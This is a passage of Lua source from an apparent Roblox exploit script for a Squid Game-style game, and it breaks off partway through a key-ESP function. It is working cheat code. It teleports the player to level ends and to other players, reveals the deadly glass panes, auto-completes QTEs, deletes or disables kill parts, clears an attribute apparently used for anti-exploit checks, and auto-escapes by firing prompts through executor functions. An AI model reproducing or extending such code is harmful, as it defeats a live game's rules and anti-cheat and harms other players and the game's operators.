MainModule.JR_TP_End = function()
    if MainModule.IsGameActive("JumpRope") then
        MainModule.SafeTeleport(Vector3.new(720.896057,198.628311,921.170654))
        MainModule.Notify("JumpRope","Teleported to End",0.9)
    else
        MainModule.Notify("JumpRope","Wait for JumpRope!",0.9)
        PlayErrorSound()
    end
    PlayBell()
end

MainModule.JR_DeleteRope = function()
    if MainModule.IsGameActive("JumpRope") then
        for _,o in pairs(workspace:GetDescendants()) do
            if o.Name == "Rope" and (o:IsA("Model") or o:IsA("Part")) then
                o:Destroy()
                MainModule.Notify("JumpRope","Rope deleted",0.9)
                PlayBell()
                return
            end
        end
        MainModule.Notify("JumpRope","Rope not found",0.9)
        PlayErrorSound()
    else
        MainModule.Notify("JumpRope","Wait for JumpRope!",0.9)
        PlayErrorSound()
    end
    PlayBell()
end

MainModule.JumpRopeAntiFall = {Enabled=false, Platform=nil, Conn=nil}

MainModule.ToggleJumpRopeAntiFall = function(enabled)
    local toggleRef = ToggleRefs.JumpRopeAntiFall
    
    if enabled then
        if not MainModule.CanEnableToggle("JumpRope", "Anti Fall", toggleRef) then
            return false
        end
    end
    
    if MainModule.JumpRopeAntiFall.Conn then MainModule.JumpRopeAntiFall.Conn:Disconnect() end
    if MainModule.JumpRopeAntiFall.Platform then MainModule.JumpRopeAntiFall.Platform:Destroy() end
    MainModule.JumpRopeAntiFall.Enabled = enabled
    if enabled then
        local function create()
            local c = MainModule.GetCharacter()
            if not c then return nil end
            local rp = MainModule.GetRootPart(c)
            if not rp then return nil end
            local p = Instance.new("Part")
            p.Name = "JumpRopeAntiFall"
            p.Size = Vector3.new(10000,1,10000)
            p.Position = Vector3.new(rp.Position.X, rp.Position.Y-5, rp.Position.Z)
            p.Anchored = true
            p.CanCollide = true
            p.Transparency = 1
            p.Parent = workspace
            return p
        end
        MainModule.JumpRopeAntiFall.Platform = create()
        MainModule.JumpRopeAntiFall.Conn = RunService.Heartbeat:Connect(function()
            if not MainModule.JumpRopeAntiFall.Enabled then return end
            if not MainModule.IsGameActive("JumpRope") then
                MainModule.DisableToggle("JumpRopeAntiFall")
                return
            end
            if not (MainModule.JumpRopeAntiFall.Platform and MainModule.JumpRopeAntiFall.Platform.Parent) then
                MainModule.JumpRopeAntiFall.Platform = create()
            end
        end)
    else
    end
    PlayToggleSound()
    return true
end

MainModule.GB_TP_End = function()
    if MainModule.IsGameActive("GlassBridge") then
        MainModule.SafeTeleport(Vector3.new(-196.372467,522.192139,-1534.20984))
        MainModule.Notify("GlassBridge","Teleported to End",0.9)
    else
        MainModule.Notify("GlassBridge","Wait for GlassBridge!",0.9)
        PlayErrorSound()
    end
    PlayBell()
end

MainModule.GlassESPEnabled = false

MainModule.GlassESPTransparency = 60

MainModule.ToggleGlassESP = function(enabled)
    local toggleRef = ToggleRefs.GlassESP
    
    if enabled then
        if not MainModule.CanEnableToggle("GlassBridge", "Glass ESP", toggleRef) then
            return false
        end
    end
    
    MainModule.GlassESPEnabled = enabled
    if enabled then
        local function update()
            local gh = Workspace:FindFirstChild("GlassBridge") and Workspace.GlassBridge:FindFirstChild("GlassHolder")
            if not gh then return end
            for _, l in pairs(gh:GetChildren()) do
                for _, gm in pairs(l:GetChildren()) do
                    if gm:IsA("Model") then
                        for _, p in pairs(gm:GetDescendants()) do
                            if p:IsA("BasePart") and p:GetAttribute("GlassPart") then
                                local isKilling = p:GetAttribute("ActuallyKilling") == true
                                local isDelayed = p:GetAttribute("DelayedGlass") == true
                                local isDelayedKilling = p:GetAttribute("DelayedKilling") == true
                                local delayedTime = p:GetAttribute("DelayedTime") or 0
                                
                                p.Transparency = 0.6
                                p.Material = Enum.Material.Neon
                                
                                if isDelayedKilling then
                                    p.Color = Color3.fromRGB(255, 165, 0)
                                elseif isDelayed and delayedTime > 0 then
                                    if delayedTime <= 2 then
                                        p.Color = Color3.fromRGB(255, 200, 0)
                                    elseif delayedTime <= 4 then
                                        p.Color = Color3.fromRGB(255, 215, 0)
                                    else
                                        p.Color = Color3.fromRGB(255, 255, 0)
                                    end
                                elseif isKilling then
                                    p.Color = Color3.fromRGB(255, 0, 0)
                                else
                                    p.Color = Color3.fromRGB(0, 255, 0)
                                end
                            end
                        end
                    end
                end
            end
        end
        update()
        MainModule.GlassESPConnection = RunService.Heartbeat:Connect(function() 
            if MainModule.GlassESPEnabled then 
                update() 
            end 
        end)
    else
        if MainModule.GlassESPConnection then
            MainModule.GlassESPConnection:Disconnect()
            MainModule.GlassESPConnection = nil
        end
        local gh = Workspace:FindFirstChild("GlassBridge") and Workspace.GlassBridge:FindFirstChild("GlassHolder")
        if gh then
            for _, l in pairs(gh:GetChildren()) do
                for _, gm in pairs(l:GetChildren()) do
                    if gm:IsA("Model") then
                        for _, p in pairs(gm:GetDescendants()) do
                            if p:IsA("BasePart") and p:GetAttribute("GlassPart") then
                                p.Color = Color3.fromRGB(163, 162, 165)
                                p.Material = Enum.Material.Glass
                                p.Transparency = 0
                            end
                        end
                    end
                end
            end
        end
    end
    PlayToggleSound()
    return true
end

MainModule.LegitAutoQTEEnabled = false
MainModule.LegitAutoQTELoop = nil
MainModule.LegitAutoQTEProcessed = {}
MainModule.LegitAutoQTELastCleanup = 0

MainModule.HasPowerHold = function()
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if not backpack then return false end
    
    for _, item in ipairs(backpack:GetChildren()) do
        if item.Name and item.Name:lower():find("power") then
            return true
        end
    end
    return false
end

MainModule.ToggleLegitAutoQTE = function(enabled)
    local toggleRef = ToggleRefs.LegitAutoQTE
    
    if enabled then
        if MainModule.IsXenoExecutor() then
            MainModule.Notify("Legit Auto QTE", "Not supported in your executor", 0.9)
            PlayErrorSound()
            if toggleRef and toggleRef.SetValue then
                pcall(function() toggleRef:SetValue(false) end)
            end
            return false
        end
    end
    
    MainModule.LegitAutoQTEEnabled = enabled
    
    if MainModule.LegitAutoQTELoop then
        task.cancel(MainModule.LegitAutoQTELoop)
        MainModule.LegitAutoQTELoop = nil
    end
    
    MainModule.LegitAutoQTEProcessed = {}
    MainModule.LegitAutoQTELastCleanup = 0
    
    if enabled then
        MainModule.LegitAutoQTELoop = task.spawn(function()
            local QTE = nil
            local success, module = pcall(function()
                return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("HBGQTE"))
            end)
            if success then
                QTE = module
            else
                MainModule.Notify("Legit Auto QTE", "Failed to load QTE module", 0.9)
                PlayErrorSound()
                MainModule.LegitAutoQTEEnabled = false
                if toggleRef and toggleRef.SetValue then
                    pcall(function() toggleRef:SetValue(false) end)
                end
                return
            end
            
            while MainModule.LegitAutoQTEEnabled do
                task.wait(0.1)
                
                if tick() - MainModule.LegitAutoQTELastCleanup > 2 then
                    MainModule.LegitAutoQTEProcessed = {}
                    MainModule.LegitAutoQTELastCleanup = tick()
                end
                
                pcall(function()
                    if QTE and QTE.ActiveButtons then
                        for _, data in pairs(QTE.ActiveButtons) do
                            if data and data.Inner and data.Outer 
                            and not MainModule.LegitAutoQTEProcessed[data] 
                            and not data.Inner:GetAttribute("Tweening")
                            and not data.Inner:GetAttribute("Failed") then
                                
                                MainModule.LegitAutoQTEProcessed[data] = true
                                local delayTime = MainModule.HasPowerHold() and 0.95 or 0.5
                                
                                task.delay(delayTime, function()
                                    if MainModule.LegitAutoQTEEnabled and data and data.Inner and not data.Inner:GetAttribute("Failed") then
                                        pcall(function()
                                            QTE.Pressed(false, data)
                                        end)
                                    end
                                end)
                            end
                        end
                    end
                end)
            end
        end)
        PlayBell()
    else
        PlayToggleSound()
    end
    return true
end

MainModule.SetGlassESPTransparency = function(value)
    MainModule.GlassESPTransparency = value / 100
    if MainModule.GlassESPEnabled then
        local gh = Workspace:FindFirstChild("GlassBridge") and Workspace.GlassBridge:FindFirstChild("GlassHolder")
        if gh then
            for _, l in pairs(gh:GetChildren()) do
                for _, gm in pairs(l:GetChildren()) do
                    if gm:IsA("Model") then
                        for _, p in pairs(gm:GetDescendants()) do
                            if p:IsA("BasePart") and p:GetAttribute("GlassPart") then
                                p.Transparency = MainModule.GlassESPTransparency
                            end
                        end
                    end
                end
            end
        end
    end
end

MainModule.TitleEnabled = false
MainModule.CurrentTitleValue = "Rich Billionaire"
MainModule.TitleLoopConnection = nil

function MainModule.UpdateTitle()
    if MainModule.TitleEnabled and MainModule.CurrentTitleValue then
        LocalPlayer:SetAttribute("_CurrentTitle", MainModule.CurrentTitleValue)
    end
end

function MainModule.StartTitleLoop()
    if MainModule.TitleLoopConnection then
        MainModule.TitleLoopConnection:Disconnect()
        MainModule.TitleLoopConnection = nil
    end
    
    MainModule.TitleLoopConnection = RunService.Heartbeat:Connect(function()
        if MainModule.TitleEnabled then
            MainModule.UpdateTitle()
        end
    end)
end

function MainModule.ToggleFreeTitle(enabled)
    MainModule.TitleEnabled = enabled
    
    if enabled then
        MainModule.UpdateTitle()
        MainModule.StartTitleLoop()
    else
        if MainModule.TitleLoopConnection then
            MainModule.TitleLoopConnection:Disconnect()
            MainModule.TitleLoopConnection = nil
        end
        LocalPlayer:SetAttribute("_CurrentTitle", "")
    end
    PlayToggleSound()
end

function MainModule.SetTitle(value)
    MainModule.CurrentTitleValue = value
    if MainModule.TitleEnabled then
        MainModule.UpdateTitle()
    end
end

MainModule.AntiBreakEnabled = false
MainModule.AntiBreakConn = nil
MainModule.SafetyPlatforms = {}

MainModule.ToggleAntiBreak = function(enabled)
    local toggleRef = ToggleRefs.AntiBreak
    
    if enabled then
        if not MainModule.CanEnableToggle("GlassBridge", "Anti Break", toggleRef) then
            return false
        end
    end
    
    if MainModule.AntiBreakConn then MainModule.AntiBreakConn:Disconnect(); MainModule.AntiBreakConn = nil end
    for _,p in pairs(MainModule.SafetyPlatforms) do if p then p:Destroy() end end
    MainModule.SafetyPlatforms = {}
    MainModule.AntiBreakEnabled = enabled
    if enabled then
        MainModule.AntiBreakConn = RunService.Heartbeat:Connect(function()
            if not MainModule.AntiBreakEnabled then return end
            if not MainModule.IsGameActive("GlassBridge") then
                MainModule.DisableToggle("AntiBreak")
                return
            end
            local gh = Workspace:FindFirstChild("GlassBridge") and Workspace.GlassBridge:FindFirstChild("GlassHolder")
            if not gh then return end
            for _,l in pairs(gh:GetChildren()) do
                for _,gm in pairs(l:GetChildren()) do
                    if gm:IsA("Model") and gm.PrimaryPart then
                        if gm.PrimaryPart:GetAttribute("exploitingisevil") then
                            gm.PrimaryPart:SetAttribute("exploitingisevil", nil)
                        end
                        if not MainModule.SafetyPlatforms[gm] then
                            local p = Instance.new("Part")
                            p.Name = "GlassSafetyPlatform"
                            p.Size = Vector3.new(20,1,20)
                            p.Position = gm.PrimaryPart.Position + Vector3.new(0,-2,0)
                            p.Anchored = true
                            p.CanCollide = true
                            p.Transparency = 1
                            p.Parent = workspace
                            MainModule.SafetyPlatforms[gm] = p
                        end
                    end
                end
            end
        end)
    else
    end
    PlayToggleSound()
    return true
end

MainModule.TeleportToHider = function()
    if not MainModule.IsGameActive("HideAndSeek") then
        Library:Notify({Title = "HNS", Description = "Wait for HideAndSeek!", Duration = 0.9})
        PlayErrorSound()
        return
    end
    local c = MainModule.GetCharacter()
    if not c then return end
    for _,p in pairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and MainModule.IsHider(p) and p.Character then
            local humanoid = p.Character:FindFirstChildOfClass("Humanoid")
            if humanoid and humanoid.Health > 0 then
                local hr = p.Character:FindFirstChild("HumanoidRootPart")
                if hr then
                    local rp = MainModule.GetRootPart(c)
                    if rp then
                        rp.CFrame = CFrame.new(hr.Position.X, hr.Position.Y+3, hr.Position.Z)
                        Library:Notify({Title = "HNS", Description = "Teleported to hider: "..p.Name, Duration = 0.9})
                        PlayBell()
                        return
                    end
                end
            end
        end
    end
    Library:Notify({Title = "HideAndSeek", Description = "No hider's found :c", Duration = 0.9})
    PlayErrorSound()
end

MainModule.TeleportToSeeker = function()
    if not MainModule.IsGameActive("HideAndSeek") then
        Library:Notify({Title = "HideAndSeek", Description = "Wait for HideAndSeek!", Duration = 0.9})
        PlayErrorSound()
        return
    end
    local c = MainModule.GetCharacter()
    if not c then return end
    for _,p in pairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and MainModule.IsSeeker(p) and p.Character then
            local humanoid = p.Character:FindFirstChildOfClass("Humanoid")
            if humanoid and humanoid.Health > 0 then
                local hr = p.Character:FindFirstChild("HumanoidRootPart")
                if hr then
                    local rp = MainModule.GetRootPart(c)
                    if rp then
                        rp.CFrame = CFrame.new(hr.Position.X, hr.Position.Y+3, hr.Position.Z)
                        Library:Notify({Title = "HNS", Description = "Teleported to seeker: "..p.Name, Duration = 0.9})
                        PlayBell()
                        return
                    end
                end
            end
        end
    end
    Library:Notify({Title = "HideAndSeek", Description = "No seeker's found :c", Duration = 0.9})
    PlayErrorSound()
end

MainModule.SpikesKillFeature = {
    Enabled = false,
    AnimationIds = {
        "rbxassetid://105341857343164",
        "rbxassetid://95623680038308",
        "rbxassetid://106191977814264",
        "rbxassetid://79549040943367",
        "rbxassetid://138639404847153",
        "rbxassetid://81533666958052",
        "rbxassetid://118039465583394"
    },
    SpikesPosition = nil,
    PlatformHeightOffset = 10,
    ReturnDelay = 1,
    OriginalCFrame = nil,
    ActiveAnimation = false,
    AnimationStartTime = 0,
    AnimationConnection = nil,
    CharacterAddedConnection = nil,
    AnimationStoppedConnections = {},
    AnimationCheckConnection = nil,
    TrackedAnimations = {},
    SafetyCheckConnection = nil,
    PlatformPart = nil,
    PlatformCreated = false
}

function MainModule.ToggleSpikesKill(enabled)
    if enabled and not MainModule.IsGameActive("HideAndSeek") then
        MainModule.Notify("Spikes Kill", "Wait for HideAndSeek!", 0.9)
        PlayErrorSound()
        MainModule.SpikesKillFeature.Enabled = false
        return
    end
    
    if MainModule.SpikesKillFeature.AnimationConnection then
        MainModule.SpikesKillFeature.AnimationConnection:Disconnect()
        MainModule.SpikesKillFeature.AnimationConnection = nil
    end
    if MainModule.SpikesKillFeature.CharacterAddedConnection then
        MainModule.SpikesKillFeature.CharacterAddedConnection:Disconnect()
        MainModule.SpikesKillFeature.CharacterAddedConnection = nil
    end
    if MainModule.SpikesKillFeature.SafetyCheckConnection then
        MainModule.SpikesKillFeature.SafetyCheckConnection:Disconnect()
        MainModule.SpikesKillFeature.SafetyCheckConnection = nil
    end
    if MainModule.SpikesKillFeature.AnimationCheckConnection then
        MainModule.SpikesKillFeature.AnimationCheckConnection:Disconnect()
        MainModule.SpikesKillFeature.AnimationCheckConnection = nil
    end
    
    for _, conn in ipairs(MainModule.SpikesKillFeature.AnimationStoppedConnections) do
        pcall(function() conn:Disconnect() end)
    end
    MainModule.SpikesKillFeature.AnimationStoppedConnections = {}
    
    if MainModule.SpikesKillFeature.PlatformPart then
        pcall(function() MainModule.SpikesKillFeature.PlatformPart:Destroy() end)
        MainModule.SpikesKillFeature.PlatformPart = nil
    end
    MainModule.SpikesKillFeature.PlatformCreated = false
    
    MainModule.SpikesKillFeature.OriginalCFrame = nil
    MainModule.SpikesKillFeature.ActiveAnimation = false
    MainModule.SpikesKillFeature.AnimationStartTime = 0
    MainModule.SpikesKillFeature.TrackedAnimations = {}
    MainModule.SpikesKillFeature.SpikesPosition = nil
    
    if not enabled then
        MainModule.SpikesKillFeature.Enabled = false
        PlayToggleSound()
        return
    end
    
    pcall(function()
        local hideAndSeekMap = workspace:FindFirstChild("HideAndSeekMap")
        local killingParts = hideAndSeekMap and hideAndSeekMap:FindFirstChild("KillingParts")
        if killingParts then
            for _, spike in pairs(killingParts:GetChildren()) do
                if spike:IsA("BasePart") then
                    if not MainModule.SpikesKillFeature.SpikesPosition then
                        MainModule.SpikesKillFeature.SpikesPosition = spike.Position
                    end
                    spike:Destroy()
                end
            end
        end
    end)
    
    local function createSafetyPlatform()
        if MainModule.SpikesKillFeature.PlatformCreated then return end
        if not MainModule.SpikesKillFeature.SpikesPosition then return end
        
        pcall(function()
            local platform = Instance.new("Part")
            platform.Name = "SafetyPlatform"
            platform.Size = Vector3.new(20, 1, 20)
            platform.Position = MainModule.SpikesKillFeature.SpikesPosition + Vector3.new(0, MainModule.SpikesKillFeature.PlatformHeightOffset, 0)
            platform.Anchored = true
            platform.CanCollide = true
            platform.Transparency = 1
            platform.Color = Color3.fromRGB(0, 255, 0)
            
            local collision = Instance.new("BoolValue")
            collision.Name = "SafePlatform"
            collision.Value = true
            collision.Parent = platform
            
            platform.Parent = workspace
            
            MainModule.SpikesKillFeature.PlatformPart = platform
            MainModule.SpikesKillFeature.PlatformCreated = true
        end)
    end
    
    local function teleportToSafetyPlatform(character)
        if not character or not character:FindFirstChild("HumanoidRootPart") then
            return
        end
        
        if not MainModule.SpikesKillFeature.PlatformCreated then
            createSafetyPlatform()
        end
        
        if MainModule.SpikesKillFeature.SpikesPosition and MainModule.SpikesKillFeature.PlatformPart then
            MainModule.SpikesKillFeature.OriginalCFrame = character:GetPrimaryPartCFrame()
            
            local targetPosition = MainModule.SpikesKillFeature.PlatformPart.Position + Vector3.new(0, 3, 0)
            character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
        end
    end
    
    local function returnToOriginalPosition(character)
        if not character or not character:FindFirstChild("HumanoidRootPart") then
            return
        end
        
        if MainModule.SpikesKillFeature.OriginalCFrame then
            character:SetPrimaryPartCFrame(MainModule.SpikesKillFeature.OriginalCFrame)
            MainModule.SpikesKillFeature.OriginalCFrame = nil
        end
    end
    
    local function isKillAnimation(animationId)
        for _, id in ipairs(MainModule.SpikesKillFeature.AnimationIds) do
            if animationId == id then
                return true
            end
        end
        return false
    end
    
    local function setupCharacter(char)
        local humanoid = char:WaitForChild("Humanoid")
        
        MainModule.SpikesKillFeature.AnimationConnection = humanoid.AnimationPlayed:Connect(function(track)
            if not MainModule.SpikesKillFeature.Enabled then return end
            
            if track.Animation and isKillAnimation(track.Animation.AnimationId) then
                MainModule.SpikesKillFeature.TrackedAnimations[track] = true
                
                if not MainModule.SpikesKillFeature.ActiveAnimation then
                    MainModule.SpikesKillFeature.ActiveAnimation = true
                    MainModule.SpikesKillFeature.AnimationStartTime = tick()
                    
                    teleportToSafetyPlatform(char)
                    
                    local stoppedConn = track.Stopped:Connect(function()
                        task.wait(MainModule.SpikesKillFeature.ReturnDelay)
                        
                        if MainModule.SpikesKillFeature.OriginalCFrame then
                            returnToOriginalPosition(char)
                            MainModule.SpikesKillFeature.ActiveAnimation = false
                            MainModule.SpikesKillFeature.TrackedAnimations = {}
                        end
                    end)
                    table.insert(MainModule.SpikesKillFeature.AnimationStoppedConnections, stoppedConn)
                end
            end
        end)
    end
    
    local char = LocalPlayer.Character
    if char then
        setupCharacter(char)
    end
    
    MainModule.SpikesKillFeature.CharacterAddedConnection = LocalPlayer.CharacterAdded:Connect(function(newChar)
        task.wait(1)
        setupCharacter(newChar)
    end)
    
    MainModule.SpikesKillFeature.SafetyCheckConnection = RunService.Heartbeat:Connect(function()
        if not MainModule.SpikesKillFeature.Enabled then 
            if MainModule.SpikesKillFeature.SafetyCheckConnection then
                MainModule.SpikesKillFeature.SafetyCheckConnection:Disconnect()
                MainModule.SpikesKillFeature.SafetyCheckConnection = nil
            end
            return 
        end
        
        if not MainModule.IsGameActive("HideAndSeek") then
            MainModule.SpikesKillFeature.Enabled = false
            PlayErrorSound()
            
            return
        end
        
        if MainModule.SpikesKillFeature.PlatformCreated and 
           (not MainModule.SpikesKillFeature.PlatformPart or not MainModule.SpikesKillFeature.PlatformPart.Parent) then
            MainModule.SpikesKillFeature.PlatformCreated = false
            MainModule.SpikesKillFeature.PlatformPart = nil
            createSafetyPlatform()
        end
        
        if MainModule.SpikesKillFeature.ActiveAnimation and tick() - MainModule.SpikesKillFeature.AnimationStartTime >= 10 then
            local character = MainModule.GetCharacter()
            if character and MainModule.SpikesKillFeature.OriginalCFrame then
                returnToOriginalPosition(character)
            end
            MainModule.SpikesKillFeature.ActiveAnimation = false
            MainModule.SpikesKillFeature.TrackedAnimations = {}
        end
    end)
    
    MainModule.SpikesKillFeature.Enabled = true
    
    PlayToggleSound()
    
    createSafetyPlatform()
end

MainModule.DeleteSpikes = function()
    local ws = Workspace
    local map = ws:FindFirstChild("HideAndSeekMap")
    if map and map:FindFirstChild("KillingParts") then
        for _, spikePart in ipairs(map.KillingParts:GetDescendants()) do
            if spikePart.Name == "Spikes" and spikePart:IsA("BasePart") then
                spikePart.CanTouch = false
            end
        end
        MainModule.Notify("Delete Spikes","Removed",0.9)
        PlayDeathSound()
    else
        MainModule.Notify("Delete Spikes","Map not found",0.9)
        PlayErrorSound()
    end
    PlayBell()
end

MainModule.TeleportToSpawn = function()
    local character = MainModule.GetCharacter()
    if not character then
        MainModule.Notify("Teleport", "Character not found", 0.9)
        PlayErrorSound()
        return
    end
    
    local rootPart = MainModule.GetRootPart(character)
    if not rootPart then
        MainModule.Notify("Teleport", "Root part not found", 0.9)
        PlayErrorSound()
        return
    end
    
    local spawnPos = Vector3.new(196.83342, 55.9547985, -90.4745865)
    rootPart.CFrame = CFrame.new(spawnPos)
    
    PlayBell()
end

MainModule.AutoEscapeEnabled = false
MainModule.AutoEscapeConnection = nil

MainModule.ToggleAutoEscape = function(enabled)
    local toggleRef = ToggleRefs.AutoEscape
    
    if enabled then
        if not MainModule.CanEnableToggle("HideAndSeek", "Auto Escape", toggleRef) then
            return false
        end
        if not MainModule.AutoPickupEnabled then
            MainModule.ToggleAutoPickup(true)
            if ToggleRefs.AutoPickup then
                ToggleRefs.AutoPickup:SetValue(true)
            end
        end
    else
        if MainModule.AutoPickupEnabled then
            MainModule.ToggleAutoPickup(false)
            if ToggleRefs.AutoPickup then
                ToggleRefs.AutoPickup:SetValue(false)
            end
        end
    end
    
    MainModule.AutoEscapeEnabled = enabled
    
    if enabled then
        task.spawn(function()
            local Players = game:GetService("Players")
            local Workspace = game:GetService("Workspace")
            local player = Players.LocalPlayer
            
            local Values = Workspace:WaitForChild("Values")
            local CurrentGame = Values:WaitForChild("CurrentGame")
            
            if CurrentGame.Value ~= "HideAndSeek" then
                MainModule.AutoEscapeEnabled = false
                return
            end
            
            local character = player.Character or player.CharacterAdded:Wait()
            local hrp = character:WaitForChild("HumanoidRootPart")
            
            local hideAndSeekMap = Workspace:WaitForChild("HideAndSeekMap")
            local newFixedDoors = hideAndSeekMap:WaitForChild("NEWFIXEDDOORS")
            local effectsFolder = Workspace:WaitForChild("Effects")
            
            local killingPartsModel = hideAndSeekMap:WaitForChild("KillingParts")
            local killingParts = {}
            for _, part in ipairs(killingPartsModel:GetDescendants()) do
                if part:IsA("BasePart") then
                    table.insert(killingParts, part)
                end
            end
            
            local originalCanTouch = {}
            for _, part in ipairs(killingParts) do
                originalCanTouch[part] = part.CanTouch
            end
            
            local function disableKillingParts()
                for _, part in ipairs(killingParts) do
                    part.CanTouch = false
                end
            end
            
            local function restoreKillingParts()
                for _, part in ipairs(killingParts) do
                    if originalCanTouch[part] ~= nil then
                        part.CanTouch = originalCanTouch[part]
                    end
                end
            end
            
            local function getCurrentKeys()
                return player:FindFirstChild("CurrentKeys")
            end
            
            local function hasKey(keyName)
                local currentKeys = getCurrentKeys()
                return currentKeys and currentKeys:FindFirstChild(keyName) ~= nil
            end
            
            local function getMissingKeys()
                local needed = {"Circle", "Triangle", "Square"}
                local missing = {}
                for _, name in ipairs(needed) do
                    if not hasKey(name) then
                        table.insert(missing, name)
                    end
                end
                return missing
            end
            
            local function teleportTo(pos)
                if typeof(pos) == "Vector3" then
                    hrp.CFrame = CFrame.new(pos)
                elseif typeof(pos) == "CFrame" then
                    hrp.CFrame = pos
                end
            end
            
            local function firePromptExecutor(prompt)
                if not prompt or not prompt:IsA("ProximityPrompt") then return end
                
                if fireproximityprompt then
                    pcall(function()
                        fireproximityprompt(prompt)
                    end)
                elseif syn and syn.proximityprompt then
                    pcall(function()
                        syn.proximityprompt(prompt)
                    end)
                else
                    local originalDuration = prompt.HoldDuration
                    prompt.HoldDuration = 0
                    pcall(function()
                        prompt:InputHoldBegin()
                        task.wait()
                        prompt:InputHoldEnd()
                    end)
                    prompt.HoldDuration = originalDuration
                end
            end
            
            local function getValidExitDoors()
                local valid = {}
                for _, floorFolder in ipairs(newFixedDoors:GetChildren()) do
                    if floorFolder:IsA("Folder") and floorFolder:FindFirstChild("EXITDOORS") then
                        for _, door in ipairs(floorFolder.EXITDOORS:GetChildren()) do
                            if door:IsA("Model")
                            and door.Name == "EXITDOOR"
                            and door:GetAttribute("ActuallyWorks") == true
                            then
                                table.insert(valid, door)
                            end
                        end
                    end
                end
                return valid
            end
            
            local function selectTargetDoor()
                local valid = getValidExitDoors()
                if #valid == 0 then return nil end
                table.sort(valid, function(a, b)
                    return a.Name < b.Name
                end)
                return valid[1]
            end
            
            local function findTeleportPart(door)
                local doorKnob = door:FindFirstChild("DoorKnob")
                if not doorKnob then return nil end
                
                for _, child in ipairs(doorKnob:GetDescendants()) do
                    if pcall(function() return child.CFrame end) then
                        return child
                    end
                end
                return nil
            end
            
            local keyDropWatcher
            
            local function disconnectKeyWatcher()
                if keyDropWatcher then
                    keyDropWatcher:Disconnect()
                    keyDropWatcher = nil
                end
            end
            
            local function collectDroppedKey(model)
                if not MainModule.AutoEscapeEnabled or player:FindFirstChild("Escaped") then
                    return
                end
                if not (model:IsA("Model") and model.Name:match("^DroppedKey")) then
                    return
                end
                local keyName = model.Name:gsub("^DroppedKey", "")
                if hasKey(keyName) then
                    return
                end
                local pos = model.PrimaryPart and model.PrimaryPart.Position or model:GetPivot().Position
                disableKillingParts()
                teleportTo(pos + Vector3.new(0, 5, 0))
                task.wait(0.1)
                restoreKillingParts()
            end
            
            local function connectKeyWatcher()
                disconnectKeyWatcher()
                keyDropWatcher = effectsFolder.ChildAdded:Connect(function(child)
                    if child:IsA("Model") and child.Name:match("^DroppedKey") then
                        collectDroppedKey(child)
                    end
                end)
            end
            
            CurrentGame:GetPropertyChangedSignal("Value"):Connect(function()
                if MainModule.AutoEscapeEnabled and CurrentGame.Value ~= "HideAndSeek" then
                    MainModule.AutoEscapeEnabled = false
                    disconnectKeyWatcher()
                end
            end)
            
            connectKeyWatcher()
            
            while MainModule.AutoEscapeEnabled do
                repeat
                    if player:FindFirstChild("Escaped") then
                        MainModule.AutoEscapeEnabled = false
                        break
                    end
                    
                    local missing = getMissingKeys()
                    if #missing > 0 then
                        task.wait(0.5)
                        break
                    end
                    
                    local targetDoor = selectTargetDoor()
                    if targetDoor then
                        local teleportPart = findTeleportPart(targetDoor)
                        if teleportPart then
                            local frontOffset = teleportPart.CFrame.LookVector * -2
                            local targetCFrame = CFrame.lookAt(
                                teleportPart.CFrame.Position + frontOffset,
                                teleportPart.CFrame.Position
                            )
                            teleportTo(targetCFrame)
                            
                            local circle =
                                targetDoor:FindFirstChild("DoorKnob") and
                                targetDoor.DoorKnob:FindFirstChild("Circle")
                            
                            local prompt =
                                circle and circle:FindFirstChildOfClass("ProximityPrompt") or
                                circle and circle:FindFirstChild("EscapePrompt")
                            
                            if prompt then
                                repeat
                                    if player:FindFirstChild("Escaped") then
                                        MainModule.AutoEscapeEnabled = false
                                        break
                                    end
                                    firePromptExecutor(prompt)
                                    task.wait(0.05)
                                until not MainModule.AutoEscapeEnabled
                            end
                        end
                    end
                    
                until true
                
                task.wait(0.5)
            end
            
            disconnectKeyWatcher()
        end)
    else
    end
    PlayToggleSound()
    return true
end

MainModule.TeleportRandomExit = function()
    local character = MainModule.GetCharacter()
    if not character then
        MainModule.Notify("Teleport", "Character not found", 0.9)
        PlayErrorSound()
        return
    end
    
    local rootPart = MainModule.GetRootPart(character)
    if not rootPart then
        MainModule.Notify("Teleport", "Root part not found", 0.9)
        PlayErrorSound()
        return
    end
    
    if not MainModule.IsGameActive("HideAndSeek") then
        MainModule.Notify("Teleport", "hns doesnt active dumbass", 0.9)
        PlayErrorSound()
        return
    end
    
    local hideAndSeekMap = workspace:FindFirstChild("HideAndSeekMap")
    if not hideAndSeekMap then
        MainModule.Notify("Teleport", "hns doesnt active lol", 0.9)
        PlayErrorSound()
        return
    end
    
    local newFixedDoors = hideAndSeekMap:FindFirstChild("NEWFIXEDDOORS")
    if not newFixedDoors then
        MainModule.Notify("Teleport", "NEWFIXEDDOORS not found", 0.9)
        PlayErrorSound()
        return
    end
    
    local validDoors = {}
    
    for _, doorGroup in ipairs(newFixedDoors:GetChildren()) do
        local exitDoors = doorGroup:FindFirstChild("EXITDOORS")
        if exitDoors then
            for _, door in ipairs(exitDoors:GetChildren()) do
                if door:GetAttribute("ActuallyWorks") == true then
                    local part = door.PrimaryPart or door:FindFirstChild("DoorRoot")
                    if part then
                        table.insert(validDoors, part)
                    end
                end
            end
        end
    end
    
    if #validDoors == 0 then
        MainModule.Notify("Teleport", "No valid exit doors found", 0.9)
        PlayErrorSound()
        return
    end
    
    local randomDoor = validDoors[math.random(1, #validDoors)]
    local lookVector = randomDoor.CFrame.LookVector
    local teleportPos = randomDoor.Position + lookVector * 3
    local teleportPosHigh = teleportPos + Vector3.new(0, 4, 0)
    
    rootPart.CFrame = CFrame.new(teleportPosHigh, randomDoor.Position)
    
    PlayBell()
end

MainModule.KeyESPEnabled = false
MainModule.KeyESPConnection = nil
MainModule.KeyESPBoxes = {}

MainModule.ToggleKeyESP = function(enabled)
    local toggleRef = ToggleRefs.KeyESP
    
    if enabled then
        if not MainModule.CanEnableToggle("HideAndSeek", "Key ESP", toggleRef) then
            return false
        end
    end
    
    MainModule.KeyESPEnabled = enabled
    
    if MainModule.KeyESPConnection then
        MainModule.KeyESPConnection:Disconnect()
        MainModule.KeyESPConnection = nil
    end
    
    for _, esp in pairs(MainModule.KeyESPBoxes) do
        if esp then pcall(function() esp:Destroy() end) end
    end
    MainModule.KeyESPBoxes = {}
    
    if enabled then
        task.spawn(function()
